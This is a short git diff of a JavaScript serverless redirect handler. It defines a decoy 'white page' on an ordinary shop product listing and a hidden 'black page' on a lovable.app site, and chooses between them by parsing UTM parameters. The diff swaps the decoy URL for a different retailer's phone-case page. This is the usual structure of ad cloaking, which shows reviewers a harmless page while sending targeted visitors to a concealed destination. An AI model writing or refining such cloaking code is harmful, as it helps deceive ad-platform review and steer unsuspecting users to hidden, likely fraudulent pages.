@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://tinnitots.com.au/products/seashell-sensory-playmat";
+    const whitePageURL = "https://www.ordernation.com/products/samsung-galaxy-s25-ultra-cover-black-luxury-primum-leather-back-wireless-magsafe-charger-kickstand-bracket-holder-soft-border-case-on5387-s25u-black";
     const blackPageURL = "https://msgurupml.lovable.app/";
   
     // Parse the UTM parameters from the request URL
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
